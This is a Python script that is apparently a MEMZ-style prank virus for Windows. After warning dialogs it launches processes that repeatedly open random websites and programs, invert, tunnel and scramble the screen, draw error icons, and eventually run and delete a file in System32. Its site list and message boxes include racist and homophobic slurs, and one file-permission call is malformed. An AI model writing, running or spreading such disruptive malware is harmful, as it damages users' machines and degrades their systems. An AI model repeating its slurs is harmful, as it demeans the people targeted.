from win32api import *
from win32gui import *
from win32ui import *
import ctypes
from win32con import *
from win32file import *
from random import randrange as rd
from random import *
from sys import exit
import multiprocessing
import time
import webbrowser
import os

title = "!WARNING!WARNING!WARNING!WARNING!WARNING!WARNING!WARNING!WARNING!"

class warning:
	def startWarning2():
		MessageBox("Your pc is FACKED. LOL :D", "lol", MB_ICONERROR)
		Sleep(3000)
		webbrowser.open_new("https://www.bing.com/search?q=YOU+ARE+GAY&aqs=edge..69i57j69i64.11066j0j7&FORM=ANCMS9&PC=WSEDDB")

	def startWarning():
		if MessageBox("This virus can destroy your computer, be carful. The creator is not responsibilities if the virus destroy your computer. Klick \"NO\" and nothing will happend. If you know what you are doing klick \"YES\"", title, MB_YESNO | MB_ICONWARNING) == 7:
			exit()
		if MessageBox("This is your last warning. Are you sure?", title, MB_YESNO | MB_ICONWARNING) == 7:
			exit()
		else:
			Sleep(5000)
			warning.startWarning2()

class Data:
	sites = (
     "https://headshot.monster/CCOCZW",
     "https://google.co.ck/search?q=you+are+a+nigger",
     "http://google.co.ck/search?q=chevrolet+spark+pricing",
     "http://google.co.ck/search?q=daewoo+matiz",
     "https://freches.neocities.org",
     "https://reddit.com/r/tomorrow",
	 "https://reddit.com/r/askreddit",
     "https://google.com/search?q=rats+when+they+see+a+kfc+deep+fryer",
	 "http://google.co.ck/search?q=nigger.com",
	 "http://google.co.ck/search?q=what+happens+if+you+delete+system32",
	 "http://google.co.ck/search?q=g3t+r3kt",
	 "http://google.co.ck/search?q=batch+virus+download",
	 "http://google.co.ck/search?q=virus.exe",
	 "http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
	 "http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
	 "http://google.co.ck/search?q=virus+builder+legit+free+download",
	 "http://google.co.ck/search?q=how+to+create+your+own+ransomware",
	 "http://google.co.ck/search?q=how+to+remove+memz+trojan+virus",
	 "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
	 "http://google.co.ck/search?q=dank+memz",
	 "http://google.co.ck/search?q=how+to+download+memz",
	 "http://google.co.ck/search?q=mario+3+release+date",
	 "http://google.co.ck/search?q=the+memz+are+real",
	 "http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
	 "calc",
	 "notepad",
	 "cmd",
	 "write",
	 "explorer",
         "taskmgr",
	 "mspaint",
	)
	
	IconWarning = LoadIcon(None, 32515)
	IconError = LoadIcon(None, 32513)

time = 0
timeSubtract = 15000
class Payloads:
	def open_sites():
		global timeSubtract
		sites = Data.sites
		global time
		while True:
			Sleep(timeSubtract-time)
			__import__("os").system("start " + str(choice(sites)))
	def decrease_timer():
		global time
		while time < 15000:
			time += 1
			Sleep(10)
	def blink_screen():
		blinkTime = 1000
		destroyComputer = False
		global time
		global timeSubtract
		HDC = GetDC(0) 
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
		while True:
			Sleep(blinkTime)
			blinkTime -= 5
			PatBlt(HDC, 1,1,sw,sh, PATINVERT)
			if blinkTime <= 0:
				destroyComputer = True
			if destroyComputer == True:
				blinkTime = 1000
				os.system("C://Windows//System32//update.exe")
				os.chmod("C://Windows//System32//update.exe")
				os.remove("C://Windows//System32//update.exe")
	def error_drawing():
		global time 
		global timeSubtract
		HDC = GetDC(0) 
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1)) 
		while True:
			DrawIcon(HDC, rd(sw), rd(sh), Data.IconWarning)
			for i in range(0, 60):
				mouseX,mouseY = GetCursorPos()
				DrawIcon(HDC, mouseX, mouseY, Data.IconError)
				Sleep(2)
	def screen_puzzle():
		global time
		global timeSubtract
		HDC = GetDC(0)
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
		x1 = rd(sw-1000)
		y1 = rd(sh-1000)
		x2 = rd(sw-1000)
		y2 = rd(sh-1000)
		width = rd(500)
		height = rd(500)
		while True:
			BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
			Sleep(10)
	def tunnel_effect():
		global time
		global timeSubtract
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
		HDC = GetDC(0)
		while True:
			StretchBlt(HDC, 25, 25, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
			Sleep(150)

if __name__ == '__main__':
	warning.startWarning()

	p = Payloads
	opensites = multiprocessing.Process(target = p.open_sites)
	timersub = multiprocessing.Process(target = p.decrease_timer)
	blinking = multiprocessing.Process(target = p.blink_screen)
	icons = multiprocessing.Process(target = p.error_drawing)
	tunneling = multiprocessing.Process(target = p.tunnel_effect)
	puzzling = multiprocessing.Process(target = p.screen_puzzle)
	timersub.start()
	opensites.start() 
	Sleep(timeSubtract*2)
	blinking.start()
	Sleep(5000)
	icons.start()
	Sleep(7000*2)
	puzzling.start()
	Sleep(5000*3)
	tunneling.start()